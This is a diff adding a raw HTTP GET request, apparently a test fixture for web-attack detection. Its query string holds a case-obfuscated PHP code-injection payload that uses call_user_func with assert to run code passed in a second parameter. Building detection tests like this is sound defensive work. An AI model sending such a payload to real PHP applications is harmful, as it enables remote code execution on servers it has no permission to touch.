@@ -1,0 +1,4 @@
+GET /a?data=cAlL_uSeR_fUnC('aSsErT',$_gEt[1]) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
